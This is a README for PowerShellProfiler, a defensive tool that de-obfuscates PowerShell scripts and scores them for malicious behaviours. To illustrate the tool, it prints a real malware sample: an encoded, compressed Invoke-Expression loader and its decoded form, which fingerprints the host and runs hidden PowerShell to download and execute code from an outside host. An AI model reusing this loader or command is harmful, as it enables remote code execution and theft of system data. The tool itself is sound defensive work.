# PowerShellProfiler

PowerShellProfiler.py is a script for statically analyzing PowerShell scripts by de-obfuscating and normalizing the content which is then profiled for behavioral indicators. These behaviors are then scored and the aggregate of the scores will provide a possible risk level for the PowerShell script. This was created to highlight a practical way of tackling bulk analysis of PowerShell scripts and to assist blue teams by offering another tool that can be used to speed up analysis.

In the [Unit42 Blog Series - "Practical Behavioral Profiling of PowerShell Scripts through Static Analysis"](https://unit42.paloaltonetworks.com/practical-behavioral-profiling-of-powershell-scripts-through-static-analysis-part-1/) it covers concept, design, and the pros and cons to this approach of statically profiling behaviors within PowerShell scripts.

```
usage: PowerShellProfiler.py [-h] -f <file_name> [-d]

PowerShellProfiler analyzes PowerShell scripts statically to identify and
score behaviors.

optional arguments:
  -h, --help            show this help message and exit
  -f <file_name>, --file <file_name>
                        PowerShell Script to behaviorally profile
  -d, --debug           Enables debug output
```

### [+] Output [+]

Standard usage is fairly straight forward. Simply use the "-f" flag to pass a file name (PowerShell Script, ScriptBlock Log Export, Text File, etc) and the PowerShellProfiler.py script will output the results.

```
$ python PowerShellProfiler.py -f 1b987ba4983d98a4c2776c8afb5aebbe418cdea1a7d4960c548fb947d404e4b2.MLWR

1b987ba4983d98a4c2776c8afb5aebbe418cdea1a7d4960c548fb947d404e4b2.MLWR , 18.5 , Elevated Risk , 0:00:00.031422 , [Downloader - 1.5 | Starts Process - 1.5 | Script Execution - 1.5 | Compression - 1.5 | Enumeration - 0.5 | One Liner - 2.0 | Known Malware: Veil Stream - 10.0]
```

Output is comma-delimited and uses the following fields:

```
File Name , Profiling Score , Proposed Risk Level , Analysis Runtime , Behaviors (pipe-delimited)
```

In this case, the file "1b987ba4983d98a4c2776c8afb5aebbe418cdea1a7d4960c548fb947d404e4b2.MLWR" was identified as having characteristics/behaviors that asuggest the script is capable of downloading content, starting a process, executing additional script content, uses compression, enumerate some kind of system information, the entire script fits on one-line, and there are patterns which match a known malwware family "Veil". These behaviors are individually scored and add up to 18.5, which is in the range of the highest risk.

Additionally, there is a "debug" mode with the "-d" flag which is useful for troubleshooting failed decoding/deobfuscation, long run times, analyzing decoded content for new behaviors, and generally just more verbose output.

```
Opened File 1b987ba4983d98a4c2776c8afb5aebbe418cdea1a7d4960c548fb947d404e4b2.MLWR
[+] Normalization Function
	[!] Decompressed Content - True: 0:00:00.003425
	[!] Decoded Base64 - True: 0:00:00.001482
[+] Normalization Function
	[!] Format Replaced - True: 0:00:00.001653
	[!] Removed Back Ticks - True: 0:00:00.000002
	[!] Removed Carets - True: 0:00:00.000001
	[!] Char Replace - True: 0:00:00.000290
	[!] Type Conversion - True: 0:00:00.001309 _ 0
	[!] Joined Strings - True: 0:00:00.000287
	[!] Char Replace - None: 0:00:00.000011
	[!] Replaced Strings - True: 0:00:00.000777
[+] Normalization Function
	[!] Removed Empty Quotes - True: 0:00:00.000001
	[!] Type Conversion - True: 0:00:00.000915 _ 0
[+] Normalization Function
	[!] Type Conversion - None: 0:00:00.000916 _ 0
	[!] Decompressed Content - None: 0:00:00.003017
	[!] Decoded Base64 - None: 0:00:00.001465
[+] Normalization Function
	[!] Type Conversion - None: 0:00:00.000931 _ 0


##### TIMING / MATCH #####

Main Processing: 0:00:00.023229
Family ID: 0:00:00.002652
Behavior Check - Code Injection: 0:00:00.000395
Behavior Check - Key Logging: 0:00:00.000039
Behavior Check - Screen Scraping: 0:00:00.000066
Behavior Check - AppLocker Bypass: 0:00:00.000022
Behavior Check - AMSI Bypass: 0:00:00.000018
Behavior Check - Clear Logs: 0:00:00.000049
Behavior Check - Coin Miner: 0:00:00.000047
Behavior Check - Embedded File: 0:00:00.000019
Behavior Check - Abnormal Size: 0:00:00.000122
Behavior Check - Ransomware: 0:00:00.000053
Behavior Check - DNS C2: 0:00:00.000021
Behavior Check - Disabled Protections: 0:00:00.000049
Behavior Check - Negative Context: 0:00:00.000428
['DownloadString']
Behavior Check - Downloader: 0:00:00.000231
['Start-Process']
Behavior Check - Starts Process: 0:00:00.000097
['Invoke-Expression']
Behavior Check - Script Execution: 0:00:00.000084
['Convert', 'FromBase64String', 'Text.Encoding']
Behavior Check - Compression: 0:00:00.000034
Behavior Check - Hidden Window: 0:00:00.000027
Behavior Check - Custom Web Fields: 0:00:00.000047
Behavior Check - Persistence: 0:00:00.000024
Behavior Check - Sleeps: 0:00:00.000015
Behavior Check - Uninstalls Apps: 0:00:00.000014
Behavior Check - Obfuscation: 0:00:00.000353
Behavior Check - Crypto: 0:00:00.000084
['$env:username']
Behavior Check - Enumeration: 0:00:00.000167
Behavior Check - Registry: 0:00:00.000065
Behavior Check - Sends Data: 0:00:00.000016
Behavior Check - Byte Usage: 0:00:00.000145
Behavior Check - SysInternals: 0:00:00.000028
Behavior Check - One Liner: 0:00:00.000023
Behavior Check - Variable Extension: 0:00:00.001275
Behavior Check - Script Logging: 0:00:00.000057
Behavior Check - License: 0:00:00.000036
Behavior Check - Function Body: 0:00:00.000042
Behavior Check - Positive Context: 0:00:00.000115
Behavior ID: 0:00:00.004465
1b987ba4983d98a4c2776c8afb5aebbe418cdea1a7d4960c548fb947d404e4b2.MLWR , 18.5 , Elevated Risk , 0:00:00.030518 , [Downloader - 1.5 | Starts Process - 1.5 | Script Execution - 1.5 | Compression - 1.5 | Enumeration - 0.5 | One Liner - 2.0 | Known Malware: Veil Stream - 10.0]


##### ORIGINAL SCRIPT #####

Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('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')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();



##### ALTERED SCRIPT #####

Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('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')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();



##### DECOMPRESS CONTENT #####

 . ( $SHelLId[1]+$shElLID[13]+'x') ((("[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
try{
	$name = 'Global\PSEXEC'
	$flag = $flase

	New-Object System.Threading.Mutex ($true,$name,[ref]$flag)
}catch{}
$key = &mac=+$mac+&av=+$av+&version=+(Get-WmiObject -Class Win32_OperatingSystem).version+&bit=+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + &flag2= + $flag + &domain= + (Get-WmiObject win32_computersystem).Domain + &user= + $env:USERNAME + &PS= + $flag

try{

	if($flag){

	$onps = /c powershell -nop -w hidden -ep bypass -c + + IEX (New-Object Net.WebClient).downloadstring(' + http://p.estonine.com/renew? + $key + ') + 

	Start-Process -FilePath cmd.exe -ArgumentList $onps
	}else{}
}catch{}

")-rEPLaCe ("$"),"$"-rEPLaCe ("|"),"|"-rEPLaCe("\"),"\" -cRePLAcE',"'" -rEPLaCe (),")) 




##### B64 CONTENT #####

I%&/m{JJt$@iG#)*eVe]f@{{;N'?\fdlJ!?~|?"qnf'[3?~o?w-z>/w~/~K~{/{{O=cw~???=|K~v'>]tD,;4h}jp_I4]>c.L@%Cx8;Cza}>AA@y~1nrL#,>08LD% z7t@Q=BAkP8@]&u7O_fwa'x|LCS7o5 !0i_)F3"Ek
VSFaR2t@W2sd"O@5f2F3bv0fG=c\=finehSTO1F'@ ,tNHftxqnwQ|9|-?_BuA6I__H?_~_>WqByS|-=n.z'XSja
@/bf~_Wya4%F{{+k?_J8GY>!eYe3f=|}\Oc;_ktyg~&2}M%7wy/1wr4Wrw+Gx	(B?iu}Q{]|}-2BO4)XP#_n!Y<18>=afO1j[x~ bb(?f1-_M
IK&3<_]
wW$+<{f,KVN_+,-ft{Yx*9n"Nc,>wJYK'f+XBd
8,%pZ~gxLJ>$lm1yg
C.3 "D,.4#6XVL|QWx5pZsEWe&UL<&	MXm|gYUD4bIK	5UK4-)l&J/?	l?Sf|>k0A0_L
t_>%a0O_>Nt{oOwFOmsLyayypLWt{*xzJZ?L.O
;o?
```
